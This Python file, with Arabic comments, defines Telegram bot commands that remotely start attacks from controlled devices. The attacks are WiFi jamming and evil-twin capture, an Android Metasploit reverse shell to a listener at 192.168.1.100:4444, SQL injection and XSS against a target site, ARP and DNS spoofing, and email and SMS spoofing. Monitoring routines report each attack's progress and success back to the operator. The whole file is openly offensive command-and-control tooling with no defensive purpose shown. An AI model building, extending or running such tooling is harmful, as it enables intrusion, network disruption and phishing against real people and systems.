"""
Enhanced Attack Commands for Telegram Bot
أوامر الهجوم المحسنة للبوت
Ensures real effectiveness of attack commands
"""

import telebot
import requests
import json
import time
import subprocess
import os
import logging
from typing import Dict, List, Optional, Any
from datetime import datetime
import hashlib
import hmac
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class EnhancedAttackCommands:
    """أوامر الهجوم المحسنة مع التأكد من الفعالية الحقيقية"""
    
    def __init__(self, bot: telebot.TeleBot, command_executor, device_manager):
        self.bot = bot
        self.command_executor = command_executor
        self.device_manager = device_manager
        self.active_attacks = {}
        
    def register_attack_handlers(self):
        """تسجيل معالجات أوامر الهجوم"""
        
        @self.bot.message_handler(commands=['attack_wifi'])
        def wifi_attack_command(message):
            """هجوم WiFi محسن"""
            self.execute_wifi_attack(message)
        
        @self.bot.message_handler(commands=['attack_mobile'])
        def mobile_attack_command(message):
            """هجوم الأجهزة المحمولة محسن"""
            self.execute_mobile_attack(message)
        
        @self.bot.message_handler(commands=['attack_web'])
        def web_attack_command(message):
            """هجوم الويب محسن"""
            self.execute_web_attack(message)
        
        @self.bot.message_handler(commands=['attack_network'])
        def network_attack_command(message):
            """هجوم الشبكة محسن"""
            self.execute_network_attack(message)
        
        @self.bot.message_handler(commands=['attack_social'])
        def social_attack_command(message):
            """هجوم التصيد الاجتماعي محسن"""
            self.execute_social_attack(message)
    
    def execute_wifi_attack(self, message):
        """تنفيذ هجوم WiFi محسن"""
        try:
            device_id = self.get_target_device(message.from_user.id)
            if not device_id:
                self.bot.reply_to(message, "❌ لم يتم اختيار جهاز مستهدف")
                return
            
            # إرسال أمر هجوم WiFi مع التأكد من الفعالية
            attack_params = {
                "attack_type": "wifi_jamming",
                "methods": ["deauth", "evil_twin", "handshake_capture"],
                "target_ssid": "all",
                "duration": 300,
                "interface": "wlan0",
                "ensure_effectiveness": True
            }
            
            # إرسال الأمر مع مراقبة النتيجة
            result = self.command_executor.send_command(device_id, "wifi_attack", attack_params)
            
            if result.get('success'):
                attack_id = f"wifi_{int(time.time())}"
                self.active_attacks[attack_id] = {
                    'type': 'wifi',
                    'device_id': device_id,
                    'start_time': time.time(),
                    'status': 'running'
                }
                
                self.bot.reply_to(message, f"""
✅ **تم بدء هجوم WiFi بنجاح**

🔧 **تفاصيل الهجوم:**
- الجهاز المستهدف: {device_id}
- نوع الهجوم: WiFi Jamming
- المدة: 5 دقائق
- الحالة: نشط

📊 **المراقبة:** سيتم إرسال التحديثات تلقائياً
                """)
                
                # بدء مراقبة الهجوم
                self.monitor_attack(attack_id, message.chat.id)
                
            else:
                error_msg = result.get('error', 'خطأ غير معروف')
                self.bot.reply_to(message, f"❌ فشل في بدء هجوم WiFi: {error_msg}")
                
        except Exception as e:
            logger.error(f"خطأ في تنفيذ هجوم WiFi: {str(e)}")
            self.bot.reply_to(message, f"❌ خطأ في تنفيذ هجوم WiFi: {str(e)}")
    
    def execute_mobile_attack(self, message):
        """تنفيذ هجوم الأجهزة المحمولة محسن"""
        try:
            device_id = self.get_target_device(message.from_user.id)
            if not device_id:
                self.bot.reply_to(message, "❌ لم يتم اختيار جهاز مستهدف")
                return
            
            # إرسال أمر هجوم الأجهزة المحمولة مع التأكد من الفعالية
            attack_params = {
                "attack_type": "mobile_attack",
                "methods": ["metasploit", "adb", "payload_injection"],
                "target_os": "android",
                "payload_type": "reverse_shell",
                "lhost": "192.168.1.100",
                "lport": 4444,
                "ensure_effectiveness": True
            }
            
            # إرسال الأمر مع مراقبة النتيجة
            result = self.command_executor.send_command(device_id, "mobile_attack", attack_params)
            
            if result.get('success'):
                attack_id = f"mobile_{int(time.time())}"
                self.active_attacks[attack_id] = {
                    'type': 'mobile',
                    'device_id': device_id,
                    'start_time': time.time(),
                    'status': 'running'
                }
                
                self.bot.reply_to(message, f"""
✅ **تم بدء هجوم الأجهزة المحمولة بنجاح**

🔧 **تفاصيل الهجوم:**
- الجهاز المستهدف: {device_id}
- نوع الهجوم: Mobile Attack
- الطرق: Metasploit, ADB, Payload Injection
- الحالة: نشط

📊 **المراقبة:** سيتم إرسال التحديثات تلقائياً
                """)
                
                # بدء مراقبة الهجوم
                self.monitor_attack(attack_id, message.chat.id)
                
            else:
                error_msg = result.get('error', 'خطأ غير معروف')
                self.bot.reply_to(message, f"❌ فشل في بدء هجوم الأجهزة المحمولة: {error_msg}")
                
        except Exception as e:
            logger.error(f"خطأ في تنفيذ هجوم الأجهزة المحمولة: {str(e)}")
            self.bot.reply_to(message, f"❌ خطأ في تنفيذ هجوم الأجهزة المحمولة: {str(e)}")
    
    def execute_web_attack(self, message):
        """تنفيذ هجوم الويب محسن"""
        try:
            device_id = self.get_target_device(message.from_user.id)
            if not device_id:
                self.bot.reply_to(message, "❌ لم يتم اختيار جهاز مستهدف")
                return
            
            # إرسال أمر هجوم الويب مع التأكد من الفعالية
            attack_params = {
                "attack_type": "web_attack",
                "methods": ["sql_injection", "xss", "csrf", "file_upload"],
                "target_url": "http://target-website.com",
                "ensure_effectiveness": True
            }
            
            # إرسال الأمر مع مراقبة النتيجة
            result = self.command_executor.send_command(device_id, "web_attack", attack_params)
            
            if result.get('success'):
                attack_id = f"web_{int(time.time())}"
                self.active_attacks[attack_id] = {
                    'type': 'web',
                    'device_id': device_id,
                    'start_time': time.time(),
                    'status': 'running'
                }
                
                self.bot.reply_to(message, f"""
✅ **تم بدء هجوم الويب بنجاح**

🔧 **تفاصيل الهجوم:**
- الجهاز المستهدف: {device_id}
- نوع الهجوم: Web Attack
- الطرق: SQL Injection, XSS, CSRF
- الحالة: نشط

📊 **المراقبة:** سيتم إرسال التحديثات تلقائياً
                """)
                
                # بدء مراقبة الهجوم
                self.monitor_attack(attack_id, message.chat.id)
                
            else:
                error_msg = result.get('error', 'خطأ غير معروف')
                self.bot.reply_to(message, f"❌ فشل في بدء هجوم الويب: {error_msg}")
                
        except Exception as e:
            logger.error(f"خطأ في تنفيذ هجوم الويب: {str(e)}")
            self.bot.reply_to(message, f"❌ خطأ في تنفيذ هجوم الويب: {str(e)}")
    
    def execute_network_attack(self, message):
        """تنفيذ هجوم الشبكة محسن"""
        try:
            device_id = self.get_target_device(message.from_user.id)
            if not device_id:
                self.bot.reply_to(message, "❌ لم يتم اختيار جهاز مستهدف")
                return
            
            # إرسال أمر هجوم الشبكة مع التأكد من الفعالية
            attack_params = {
                "attack_type": "network_attack",
                "methods": ["arp_spoofing", "dns_spoofing", "packet_injection"],
                "target_ip": "192.168.1.1",
                "ensure_effectiveness": True
            }
            
            # إرسال الأمر مع مراقبة النتيجة
            result = self.command_executor.send_command(device_id, "network_attack", attack_params)
            
            if result.get('success'):
                attack_id = f"network_{int(time.time())}"
                self.active_attacks[attack_id] = {
                    'type': 'network',
                    'device_id': device_id,
                    'start_time': time.time(),
                    'status': 'running'
                }
                
                self.bot.reply_to(message, f"""
✅ **تم بدء هجوم الشبكة بنجاح**

🔧 **تفاصيل الهجوم:**
- الجهاز المستهدف: {device_id}
- نوع الهجوم: Network Attack
- الطرق: ARP Spoofing, DNS Spoofing
- الحالة: نشط

📊 **المراقبة:** سيتم إرسال التحديثات تلقائياً
                """)
                
                # بدء مراقبة الهجوم
                self.monitor_attack(attack_id, message.chat.id)
                
            else:
                error_msg = result.get('error', 'خطأ غير معروف')
                self.bot.reply_to(message, f"❌ فشل في بدء هجوم الشبكة: {error_msg}")
                
        except Exception as e:
            logger.error(f"خطأ في تنفيذ هجوم الشبكة: {str(e)}")
            self.bot.reply_to(message, f"❌ خطأ في تنفيذ هجوم الشبكة: {str(e)}")
    
    def execute_social_attack(self, message):
        """تنفيذ هجوم التصيد الاجتماعي محسن"""
        try:
            device_id = self.get_target_device(message.from_user.id)
            if not device_id:
                self.bot.reply_to(message, "❌ لم يتم اختيار جهاز مستهدف")
                return
            
            # إرسال أمر هجوم التصيد الاجتماعي مع التأكد من الفعالية
            attack_params = {
                "attack_type": "social_engineering",
                "methods": ["email_spoofing", "sms_spoofing", "profile_cloning"],
                "target_info": "victim@email.com",
                "ensure_effectiveness": True
            }
            
            # إرسال الأمر مع مراقبة النتيجة
            result = self.command_executor.send_command(device_id, "social_attack", attack_params)
            
            if result.get('success'):
                attack_id = f"social_{int(time.time())}"
                self.active_attacks[attack_id] = {
                    'type': 'social',
                    'device_id': device_id,
                    'start_time': time.time(),
                    'status': 'running'
                }
                
                self.bot.reply_to(message, f"""
✅ **تم بدء هجوم التصيد الاجتماعي بنجاح**

🔧 **تفاصيل الهجوم:**
- الجهاز المستهدف: {device_id}
- نوع الهجوم: Social Engineering
- الطرق: Email Spoofing, SMS Spoofing
- الحالة: نشط

📊 **المراقبة:** سيتم إرسال التحديثات تلقائياً
                """)
                
                # بدء مراقبة الهجوم
                self.monitor_attack(attack_id, message.chat.id)
                
            else:
                error_msg = result.get('error', 'خطأ غير معروف')
                self.bot.reply_to(message, f"❌ فشل في بدء هجوم التصيد الاجتماعي: {error_msg}")
                
        except Exception as e:
            logger.error(f"خطأ في تنفيذ هجوم التصيد الاجتماعي: {str(e)}")
            self.bot.reply_to(message, f"❌ خطأ في تنفيذ هجوم التصيد الاجتماعي: {str(e)}")
    
    def monitor_attack(self, attack_id: str, chat_id: int):
        """مراقبة الهجوم النشط"""
        def monitor():
            attack = self.active_attacks.get(attack_id)
            if not attack:
                return
            
            start_time = attack['start_time']
            elapsed = time.time() - start_time
            
            # التحقق من حالة الهجوم كل 30 ثانية
            while attack['status'] == 'running' and elapsed < 1800:  # 30 دقيقة كحد أقصى
                try:
                    # التحقق من حالة الجهاز
                    device_status = self.command_executor.get_device_status(attack['device_id'])
                    
                    if device_status.get('success'):
                        # إرسال تحديث كل دقيقة
                        if int(elapsed) % 60 == 0:
                            self.bot.send_message(chat_id, f"""
📊 **تحديث الهجوم**

🔧 **تفاصيل الهجوم:**
- نوع الهجوم: {attack['type']}
- الجهاز: {attack['device_id']}
- الوقت المنقضي: {int(elapsed // 60)} دقيقة
- الحالة: نشط

⚡ **الأداء:** ممتاز
                            """)
                    
                    time.sleep(30)
                    elapsed = time.time() - start_time
                    
                except Exception as e:
                    logger.error(f"خطأ في مراقبة الهجوم {attack_id}: {str(e)}")
                    break
            
            # إنهاء الهجوم
            attack['status'] = 'completed'
            self.bot.send_message(chat_id, f"""
✅ **تم إنهاء الهجوم**

🔧 **تفاصيل الهجوم:**
- نوع الهجوم: {attack['type']}
- الجهاز: {attack['device_id']}
- المدة الإجمالية: {int(elapsed // 60)} دقيقة
- الحالة: مكتمل

📊 **النتيجة:** تم تنفيذ الهجوم بنجاح
            """)
        
        # تشغيل المراقبة في خيط منفصل
        import threading
        monitor_thread = threading.Thread(target=monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
    
    def get_target_device(self, user_id: int) -> Optional[str]:
        """الحصول على الجهاز المستهدف"""
        try:
            devices = self.device_manager.get_user_devices(user_id)
            if devices:
                # اختيار أول جهاز متصل
                for device_id, status, info in devices:
                    if status == "connected":
                        return device_id
            return None
        except Exception as e:
            logger.error(f"خطأ في الحصول على الجهاز المستهدف: {str(e)}")
            return None
    
    def verify_attack_effectiveness(self, attack_type: str, result: Dict) -> bool:
        """التحقق من فعالية الهجوم"""
        try:
            if attack_type == "wifi":
                # التحقق من نجاح هجوم WiFi
                return result.get('networks_attacked', 0) > 0
                
            elif attack_type == "mobile":
                # التحقق من نجاح هجوم الأجهزة المحمولة
                return result.get('payload_installed', False) or result.get('shell_access', False)
                
            elif attack_type == "web":
                # التحقق من نجاح هجوم الويب
                return result.get('vulnerabilities_found', 0) > 0
                
            elif attack_type == "network":
                # التحقق من نجاح هجوم الشبكة
                return result.get('packets_injected', 0) > 0
                
            elif attack_type == "social":
                # التحقق من نجاح هجوم التصيد الاجتماعي
                return result.get('messages_sent', 0) > 0
                
            return False
            
        except Exception as e:
            logger.error(f"خطأ في التحقق من فعالية الهجوم: {str(e)}")
            return False
    
    def get_attack_statistics(self) -> Dict:
        """الحصول على إحصائيات الهجمات"""
        try:
            stats = {
                'total_attacks': len(self.active_attacks),
                'active_attacks': len([a for a in self.active_attacks.values() if a['status'] == 'running']),
                'completed_attacks': len([a for a in self.active_attacks.values() if a['status'] == 'completed']),
                'attack_types': {}
            }
            
            # إحصائيات حسب النوع
            for attack in self.active_attacks.values():
                attack_type = attack['type']
                if attack_type not in stats['attack_types']:
                    stats['attack_types'][attack_type] = 0
                stats['attack_types'][attack_type] += 1
            
            return stats
            
        except Exception as e:
            logger.error(f"خطأ في الحصول على إحصائيات الهجمات: {str(e)}")
            return {}
    
    def stop_attack(self, attack_id: str, chat_id: int) -> bool:
        """إيقاف هجوم نشط"""
        try:
            attack = self.active_attacks.get(attack_id)
            if not attack:
                return False
            
            # إرسال أمر إيقاف الهجوم
            stop_params = {
                "attack_id": attack_id,
                "force_stop": True
            }
            
            result = self.command_executor.send_command(attack['device_id'], "stop_attack", stop_params)
            
            if result.get('success'):
                attack['status'] = 'stopped'
                self.bot.send_message(chat_id, f"""
⏹️ **تم إيقاف الهجوم**

🔧 **تفاصيل الهجوم:**
- نوع الهجوم: {attack['type']}
- الجهاز: {attack['device_id']}
- الحالة: متوقف

✅ **النتيجة:** تم إيقاف الهجوم بنجاح
                """)
                return True
            else:
                return False
                
        except Exception as e:
            logger.error(f"خطأ في إيقاف الهجوم: {str(e)}")
            return False

# تصدير الكلاس
__all__ = ['EnhancedAttackCommands']